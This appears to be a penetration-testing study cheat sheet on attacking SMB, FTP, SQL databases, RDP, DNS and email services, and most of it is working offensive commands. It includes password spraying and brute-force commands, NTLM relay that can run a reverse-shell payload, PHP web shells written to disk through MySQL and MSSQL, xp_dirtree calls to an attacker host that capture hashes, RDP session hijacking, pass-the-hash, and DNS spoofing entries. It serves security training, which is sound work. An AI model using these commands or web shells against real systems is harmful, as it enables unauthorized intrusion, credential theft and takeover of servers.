## Interacting with Common Services

Covers common services, how to interact with them, and what tools to use before attacking them.

### File Share Services

#### Server Message Block (SMB)

Interact with Windows file shares via GUI, CLI (CMD/PowerShell), or by mounting from Linux.

##### Windows

```cmd
dir \\<TARGET_IP>\<SHARE>\
```

```cmd
net use n: \\<TARGET_IP>\<SHARE>
net use n: \\<TARGET_IP>\<SHARE> /user:<USERNAME> <PASSWORD>
```

```cmd
dir n: /a-d /s /b | find /c ":\"
```

`/a-d` attribute, not directories | `/s` recurse subdirectories | `/b` bare format, no headers

```cmd
dir n:\*<KEYWORD>* /s /b
findstr /s /i <KEYWORD> n:\*.*
```

Search terms worth trying: cred, password, users, secrets, key, and source extensions (.cs, .c, .go, .java, .php, .asp, .aspx, .html).

```powershell
Get-ChildItem \\<TARGET_IP>\<SHARE>\
New-PSDrive -Name "N" -Root "\\<TARGET_IP>\<SHARE>" -PSProvider "FileSystem"
```

```powershell
$username = '<USERNAME>'
$password = '<PASSWORD>'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\<TARGET_IP>\<SHARE>" -PSProvider "FileSystem" -Credential $cred
```

```powershell
(Get-ChildItem -File -Recurse | Measure-Object).Count
Get-ChildItem -Recurse -Path N:\ -Include *<KEYWORD>* -File
Get-ChildItem -Recurse -Path N:\ | Select-String "<KEYWORD>" -List
```

`Get-ChildItem`/`gci` = dir equivalent | `Select-String` = grep/findstr equivalent

##### Linux

```bash
sudo mkdir /mnt/<SHARE>
sudo mount -t cifs -o username=<USERNAME>,password=<PASSWORD>,domain=. //<TARGET_IP>/<SHARE> /mnt/<SHARE>
mount -t cifs //<TARGET_IP>/<SHARE> /mnt/<SHARE> -o credentials=<FILE>
```

```text
username=<USERNAME>
password=<PASSWORD>
domain=.
```

Requires `cifs-utils` (`sudo apt install cifs-utils`).

```bash
find /mnt/<SHARE>/ -name *<KEYWORD>*
grep -rn /mnt/<SHARE>/ -ie <KEYWORD>
```

### Email

SMTP sends mail; POP3/IMAP4 retrieve it. POP3 removes messages from the server after download by default; IMAP4 keeps them there.

```bash
sudo apt-get install evolution
```

If evolution fails with a bwrap sandbox error: `export WEBKIT_FORCE_SANDBOX=0 && evolution`. Use the Check for Supported Types option to confirm TLS/STARTTLS support.

### Databases

MySQL and MSSQL are the common relational DBs. Interact via CLI utility, a programming language, or a GUI (HeidiSQL, MySQL Workbench, SSMS, dbeaver).

#### Command Line Utilities

##### MSSQL

```bash
sqsh -S <TARGET_IP> -U <USERNAME> -P <PASSWORD>
```

```cmd
sqlcmd -S <TARGET_IP> -U <USERNAME> -P <PASSWORD>
```

##### MySQL

```bash
mysql -u <USERNAME> -p<PASSWORD> -h <TARGET_IP>
```

```cmd
mysql.exe -u <USERNAME> -p<PASSWORD> -h <TARGET_IP>
```

#### GUI Application

```bash
sudo dpkg -i dbeaver-<version>.deb
dbeaver &
```

dbeaver: multi-platform (Linux/macOS/Windows), connects to MSSQL, MySQL, PostgreSQL, and more. SSMS is Windows-only.

### Tools

SMB: `smbclient`, `CrackMapExec`, `SMBMap`, `Impacket`, `psexec.py`, `smbexec.py`  
FTP: `ftp`, `lftp`, `ncftp`, `filezilla`, `crossftp`  
Email: `Thunderbird`, `Claws`, `Geary`, `MailSpring`, `mutt`, `mailutils`, `sendEmail`, `swaks`, `sendmail`  
Databases: `mssql-cli`, `mycli`, `mssqlclient.py`, `dbeaver`, `MySQL Workbench`, `SSMS`

## The Concept of Attacks

Four-category model for analyzing any vulnerability, used throughout the module.

### Source

Where the exploited input originates: code, libraries, config, APIs, or user input.

### Processes

Where the information gets handled: PID, input, data processing, variables, logging.

### Privileges

Permission level the process runs with: System (SYSTEM/root), User, Groups, Policies, Rules.

### Destination

Where the result goes: Local (same system) or Network (remote host/service).

## Service Misconfigurations

Insecure defaults or settings left unchanged by admins/devs open unauthorized access paths.

### Authentication

Check for default credentials first. If none, try weak combos.

```text
admin:admin
admin:password
admin:<blank>
root:12345678
administrator:Password
```

### Anonymous Authentication

Service allows access without prompting for credentials.

### Misconfigured Access Rights

Accounts with permissions beyond their role can expose files meant for managers/admins only: configs, plaintext credentials, proprietary data, PII.

### Unnecessary Defaults

Default settings favor usability over security. OWASP Security Misconfiguration issues: unnecessary features/ports/services/accounts/privileges enabled, default accounts/passwords unchanged, verbose error handling revealing stack traces, outdated security features left disabled after upgrades.

## Finding Sensitive Information

Look for usernames, email addresses, passwords, DNS records, IP addresses, source code, configuration files, PII.

### Understanding of What We Have to Look For

1. Understand the service and how it works.
2. Know what you're looking for.

## Attacking FTP

File Transfer Protocol, TCP/21. Transfers and manages files; abuse via misconfiguration, excessive privileges, or known/new vulnerabilities.

### Enumeration

```bash
sudo nmap -sC -sV -p 21 <TARGET_IP>
```

`-sC` includes ftp-anon (checks anonymous login) | `-sV` grabs the banner/version

### Misconfigurations

#### Anonymous Authentication

Login with the `anonymous` username, any password.

```bash
ftp <TARGET_IP>
```

`ls`/`cd` navigate | `get` download one file | `mget` download multiple | `put` upload one file | `mput` upload multiple | `help` list commands

### Protocol Specifics Attacks

#### Brute Forcing

```bash
medusa -u <USERNAME> -P <WORDLIST> -h <TARGET_IP> -M ftp
medusa -U <WORDLIST> -P <WORDLIST> -h <TARGET_IP> -M ftp
```

Most services now defend against brute force; password spraying is more effective.

#### FTP Bounce Attack

Abuses the PORT command to make the FTP server proxy a scan/connection to another device on its network, hiding the attacker's origin.

```bash
nmap -Pn -v -n -p<PORT> -b <USERNAME>:<PASSWORD>@<PIVOT_IP> <TARGET_IP>
```

Modern FTP servers block this by default unless misconfigured.

## Attacking SMB

Protocol for shared access to files/printers. Originally NetBIOS (TCP/139, UDP/137,138); modern Windows also runs it directly on TCP/445. Samba is the Linux/Unix implementation. MSRPC commonly transports over SMB named pipes.

### Enumeration

```bash
sudo nmap <TARGET_IP> -sV -sC -p139,445
```

Reveals SMB version, hostname, and OS guess (Nmap does not reliably version-fingerprint Windows itself).

### Misconfigurations

#### Anonymous Authentication

Null session: log in with no username/password to pull shares, users, groups, permissions, policies.

##### File Share

```bash
smbclient -N -L //<TARGET_IP>
```

```bash
smbmap -H <TARGET_IP>
smbmap -H <TARGET_IP> -r <SHARE>
smbmap -H <TARGET_IP> --download '<SHARE>\<FILE>'
smbmap -H <TARGET_IP> --upload <FILE> '<SHARE>\<FILE>'
```

`-N` null session | `-L` list shares | `-r`/`-R` recursive browse

##### Remote Procedure Call (RPC)

```bash
rpcclient -U'%' <TARGET_IP>
```

```text
rpcclient $> enumdomusers
```

Enum4linux-ng automates null-session enum (workgroup/domain, users, OS info, groups, shares, password policy). Wraps nmblookup, net, rpcclient, smbclient.

```bash
./enum4linux-ng.py <TARGET_IP> -A -C
```

### Protocol Specifics Attacks

#### Brute Forcing and Password Spray

Brute force risks account lockout. Password spraying (one password across many users) is safer — two to three attempts, waiting 30-60 min between, if the lockout threshold is unknown.

```bash
crackmapexec smb <TARGET_IP> -u <WORDLIST> -p '<PASSWORD>' --local-auth
```

`--continue-on-success` keep spraying after a hit | `--local-auth` required for non-domain-joined hosts

#### SMB

Windows SMB offers a bigger attack surface than Linux once you have sufficient/admin privileges: Remote Command Execution, Extract Hashes from SAM Database, Enumerating Logged-on Users, Pass-the-Hash (PTH).

##### Remote Code Execution (RCE)

PsExec deploys a service image to the `ADMIN$` share, uses DCE/RPC over SMB to reach the Service Control Manager, starts the service, and opens a named pipe for commands.

Linux alternatives: Impacket `psexec.py` (RemComSvc), Impacket `smbexec.py` (no RemComSvc; starts a local SMB server for output — useful with no writable share), Impacket `atexec.py` (runs via Task Scheduler service), CrackMapExec (implements smbexec and atexec), Metasploit PsExec (Ruby).

###### Impacket PsExec

```bash
impacket-psexec <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

Same options apply to `impacket-smbexec` and `impacket-atexec`.

###### CrackMapExec

```bash
crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -x '<COMMAND>' --exec-method smbexec
```

`-x` run cmd command | `-X` run PowerShell command | `--exec-method` set manually (e.g. smbexec) if default atexec fails

##### Enumerating Logged-on Users

```bash
crackmapexec smb <TARGET_IP>/24 -u <USERNAME> -p '<PASSWORD>' --loggedon-users
```

##### Extract Hashes from SAM Database

Requires admin privileges. Used to authenticate as another user, crack offline, or Pass-the-Hash.

```bash
crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --sam
```

##### Pass-the-Hash (PtH)

Authenticate over SMB using a user's NTLM hash instead of their plaintext password.

```bash
crackmapexec smb <TARGET_IP> -u <USERNAME> -H <HASH>
```

##### Forced Authentication Attacks

Responder poisons LLMNR/NBT-NS/MDNS and stands up fake services (SMB included) to capture NetNTLMv1/v2 hashes when a victim's name-resolution query goes unanswered and gets broadcast.

```bash
sudo responder -I <INTERFACE>
```

Hashes save to `/usr/share/responder/logs/`. Each hash differs per capture (random per-session challenge) even for the same password.

```bash
hashcat -m 5600 <HASH_FILE> <WORDLIST>
```

If uncrackable, relay instead. Set `SMB = Off` in `/etc/responder/Responder.conf` first so ntlmrelayx can bind SMB.

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c '<COMMAND>'
```

Dumps the SAM database by default; `-c` runs a command instead (e.g. a reverse shell payload generated at revshells.com).

```bash
nc -lvnp <PORT>
```

##### RPC

Besides enumeration, RPC can change a user's password, create a domain user, or create a shared folder, given the right configuration/permissions.

## Attacking SQL Databases

MSSQL (TCP/1433, hidden mode TCP/2433) and MySQL (TCP/3306) store sensitive data and often run with high privilege — high-value targets.

### Enumeration

#### Banner Grabbing

```bash
nmap -Pn -sV -sC -p1433 <TARGET_IP>
```

Reveals version, hostname, domain info.

### Authentication Mechanisms

MSSQL: Windows authentication mode (default, tightly integrated with AD — already-authenticated Windows users need no extra creds) or Mixed mode (supports both Windows/AD accounts and SQL Server-maintained username/password pairs). MySQL also supports username/password and Windows auth (via plugin).

CVE-2012-2122: MySQL 5.6.x auth-bypass. Repeatedly authenticating with the same wrong password has a chance of being accepted due to a comparison bug; in 5.6.x, wrong-password responses are slower than correct ones, so repeated attempts can eventually succeed without the real password.

### Misconfigurations

Anonymous access, passwordless accounts, or overly permissive user/group/machine access let you connect without credentials.

### Privileges

Depending on privilege level: read/change database contents, read/change server config, execute commands, read local files, communicate with other databases, capture the local system hash, impersonate existing users, reach other networks.

### Protocol Specific Attacks

#### Read/Change the Database

```bash
mysql -u <USERNAME> -p<PASSWORD> -h <TARGET_IP>
```

```cmd
sqlcmd -S <TARGET_IP> -U <USERNAME> -P <PASSWORD> -y 30 -Y 30
```

`-y`/`-Y` (SQLCMDMAXVARTYPEWIDTH/SQLCMDMAXFIXEDTYPEWIDTH) improve output readability, may cost performance.

```bash
sqsh -S <TARGET_IP> -U <USERNAME> -P '<PASSWORD>' -h
```

`-h` disables headers/footers.

```bash
mssqlclient.py -p 1433 <USERNAME>@<TARGET_IP>
```

Windows Authentication needs a domain/hostname prefix (`-U .\<USERNAME>` or `-U <SERVERNAME>\<USERNAME>` for local accounts); without it, sqsh/sqlcmd assume SQL Authentication.

#### SQL Default Databases

MySQL: `mysql` server config/accounts | `information_schema` metadata | `performance_schema` low-level execution monitoring | `sys` interprets Performance Schema data

MSSQL: `master` instance info | `msdb` SQL Server Agent | `model` template copied for new DBs | `resource` read-only system objects visible in every DB | `tempdb` temp objects for queries

#### SQL Syntax

```sql
SHOW DATABASES;
USE <DB>;
SHOW TABLES;
SELECT * FROM <TABLE>;
```

```sql
SELECT name FROM master.dbo.sysdatabases
GO
USE <DB>
GO
SELECT table_name FROM <DB>.INFORMATION_SCHEMA.TABLES
GO
SELECT * FROM <TABLE>
GO
```

Errors occur when listing/connecting to a database you lack permission for.

#### Execute Commands

`xp_cmdshell` (MSSQL extended stored procedure) runs system commands with the SQL Server service account's rights. Disabled by default, synchronous (blocks until the command finishes).

```sql
xp_cmdshell '<COMMAND>'
GO
```

Enable if you have privileges:

```sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

Other RCE routes (out of scope here): extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, external scripts. `xp_regwrite` can escalate privileges via registry edits.

MySQL supports User Defined Functions (UDF) for C/C++ command execution — uncommon in production but worth knowing.

#### Write Local Files

MySQL has no xp_cmdshell equivalent; write into a web-served directory for code execution if privileges allow.

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '<TARGET_FILE>';
```

Requires the FILE privilege. `secure_file_priv` controls it: empty = unrestricted (insecure) | set to a dir = restricted to that dir | `NULL` = import/export disabled.

```sql
show variables like "secure_file_priv";
```

MSSQL file write needs Ole Automation Procedures enabled (admin):

```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```

```sql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '<TARGET_FILE>', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

#### Read Local Files

MSSQL reads any file the service account can access:

```sql
SELECT * FROM OPENROWSET(BULK N'<TARGET_FILE>', SINGLE_CLOB) AS Contents
GO
```

MySQL (needs FILE privilege and a permissive `secure_file_priv`):

```sql
select LOAD_FILE("<TARGET_FILE>");
```

#### Capture MSSQL Service Hash

`xp_dirtree`/`xp_subdirs` force the service account to authenticate to an attacker-controlled SMB path, leaking its NTLMv2 hash. Start Responder or impacket-smbserver first.

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\<SHARE>\'
GO
EXEC master..xp_subdirs '\\<ATTACKER_IP>\<SHARE>\'
GO
```

```bash
sudo responder -I <INTERFACE>
sudo impacket-smbserver <SHARE> ./ -smb2support
```

Crack or relay the captured hash as in SMB forced authentication.

#### Impersonate Existing Users with MSSQL

IMPERSONATE lets a user take on another login's permissions until reset/session end. Sysadmins can impersonate anyone by default; other users need it granted explicitly.

```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

```sql
EXECUTE AS LOGIN = '<USERNAME>'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Run `EXECUTE AS LOGIN` from the `master` DB — every user has access there by default. `REVERT` returns to the original login.

#### Communicate with Other Databases with MSSQL

Linked servers let one SQL Server instance query another (or a different DB product). If configured with sysadmin creds, commands run on the remote instance.

```sql
SELECT srvname, isremote FROM sysservers
GO
```

`isremote` = 1 remote server | `isremote` = 0 linked server

```sql
EXECUTE('<QUERY>') AT [<LINKED_SERVER>]
GO
```

Escape single quotes in the pass-through query with two single quotes; chain multiple statements with `;`.

## Attacking RDP

Microsoft's GUI remote-access protocol, TCP/3389. Widely used for remote administration, so a common attack gateway.

### Enumeration

```bash
nmap -Pn -p3389 <TARGET_IP>
```

### Misconfigurations

Passwordless RDP is rare but possible. Account lockout policies make brute force risky; password spraying (one password across a username list) is safer.

```bash
crowbar -b rdp -s <TARGET_IP>/32 -U <WORDLIST> -c '<PASSWORD>'
hydra -L <WORDLIST> -p '<PASSWORD>' <TARGET_IP> rdp
```

```bash
rdesktop -u <USERNAME> -p <PASSWORD> <TARGET_IP>
```

### Protocol Specific Attacks

#### RDP Session Hijacking

Needs SYSTEM privileges. `tscon` connects to another session without that user's password.

```cmd
tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>
```

Get SYSTEM via a service (services run as Local System by default):

```cmd
query user
sc.exe create <SERVICE_NAME> binpath= "cmd.exe /k tscon <SESSION_ID> /dest:<SESSION_NAME>"
net start <SERVICE_NAME>
```

Does not work on Server 2019.

#### RDP Pass-the-Hash (PtH)

Use an NT hash to RDP in without the cleartext password, via `xfreerdp /pth`. Restricted Admin Mode must be enabled on the target (disabled by default), or login fails with an account-restriction error.

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /pth:<HASH>
```

## Attacking DNS

Resolves domain names to IPs, UDP/53 (falls back to TCP/53 for large responses like zone transfers).

### Enumeration

```bash
nmap -p53 -Pn -sV -sC <TARGET_IP>
```

### DNS Zone Transfer

Zone transfers (AXFR) need no authentication by default; a misconfigured server hands its records to anyone.

```bash
dig AXFR @<NAMESERVER> <TARGET_DOMAIN>
```

```bash
fierce --domain <TARGET_DOMAIN>
```

### Domain Takeovers & Subdomain Enumeration

Domain takeover: register an expired/unclaimed domain to control it. Subdomain takeover: a CNAME points to a third-party service (AWS, GitHub, Akamai, Fastly, etc.); if that resource is deleted/expired, claiming the same name on the provider gives control of the subdomain.

#### Subdomain Enumeration

```bash
./subfinder -d <TARGET_DOMAIN> -v
```

```bash
git clone https://github.com/TheRook/subbrute.git
cd subbrute
echo "<NAMESERVER>" > ./resolvers.txt
./subbrute.py <TARGET_DOMAIN> -s ./names.txt -r ./resolvers.txt
```

Subbrute: custom resolvers, pure DNS brute force — useful for internal pentests without internet access.

```bash
host <SUBDOMAIN>.<TARGET_DOMAIN>
```

`nslookup` also works for CNAME checks. If the CNAME target returns a "not found"/unclaimed error (e.g. S3 NoSuchBucket), register that name with the provider to take the subdomain over. Check the can-i-take-over-xyz repo for which providers are vulnerable and how.

### DNS Spoofing

Also called DNS cache poisoning: altering/injecting fake DNS records to redirect traffic, via MITM (intercepting the resolution) or by compromising the DNS server itself.

#### Local DNS Cache Poisoning

```text
<TARGET_DOMAIN>      A   <ATTACKER_IP>
*.<TARGET_DOMAIN>    A   <ATTACKER_IP>
```

Edit into `/etc/ettercap/etter.dns`, scan for hosts (Hosts > Scan for Hosts), set the target IP as Target1 and the gateway as Target2, then enable the `dns_spoof` plugin (Plugins > Manage Plugins).

## Attacking Email Services

SMTP sends mail; POP3/IMAP4 retrieve it.

### Enumeration

MX records identify the responsible mail server(s); cloud providers (Google, M365, Zoho) use their own implementations with different attack surfaces than a custom/on-prem server.

```bash
host -t MX <TARGET_DOMAIN>
dig mx <TARGET_DOMAIN> | grep "MX" | grep -v ";"
host -t A <MAIL_HOSTNAME>
```

`TCP/25` SMTP unencrypted | `TCP/587` SMTP encrypted/STARTTLS | `TCP/465` SMTP encrypted | `TCP/110` POP3 unencrypted | `TCP/995` POP3 encrypted | `TCP/143` IMAP4 unencrypted | `TCP/993` IMAP4 encrypted

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <TARGET_IP>
```

### Misconfigurations

#### Authentication

`VRFY`, `EXPN`, `RCPT TO` can leak valid usernames over SMTP. `VRFY` can be disabled server-side; `EXPN` on a distribution list reveals every member's address.

```bash
telnet <TARGET_IP> 25
```

```text
VRFY <USERNAME>
EXPN <DISTRIBUTION_LIST>
MAIL FROM:<EMAIL>
RCPT TO:<USERNAME>
```

POP3 also leaks users via `USER`:

```bash
telnet <TARGET_IP> 110
```

```text
USER <USERNAME>
```

`+OK` = valid user | `-ERR` = invalid user

Automate with smtp-user-enum:

```bash
smtp-user-enum -M RCPT -U <WORDLIST> -D <TARGET_DOMAIN> -t <TARGET_IP>
```

`-M` mode: VRFY, EXPN, or RCPT | `-D` domain | `-U` userlist | `-t` target

### Cloud Enumeration

O365spray enumerates and sprays Microsoft 365.

```bash
python3 o365spray.py --validate --domain <TARGET_DOMAIN>
python3 o365spray.py --enum -U <WORDLIST> --domain <TARGET_DOMAIN>
```

Other cloud tools: MailSniper (O365), CredKing (Gmail/Okta). Keep them updated — provider behavior changes often.

### Password Attacks

```bash
hydra -L <WORDLIST> -p '<PASSWORD>' -f <TARGET_IP> pop3
```

```bash
python3 o365spray.py --spray -U <WORDLIST> -p '<PASSWORD>' --count 1 --lockout 1 --domain <TARGET_DOMAIN>
```

`--count` passwords per spray cycle | `--lockout` minutes between cycles

### Protocol Specifics Attacks

#### Open Relay

Misconfigured SMTP server relays unauthenticated mail, letting an attacker spoof a trusted sender for phishing.

```bash
nmap -p25 -Pn --script smtp-open-relay <TARGET_IP>
```

```bash
swaks --from <EMAIL> --to <EMAIL> --header 'Subject: <SUBJECT>' --body '<BODY>' --server <TARGET_IP>
```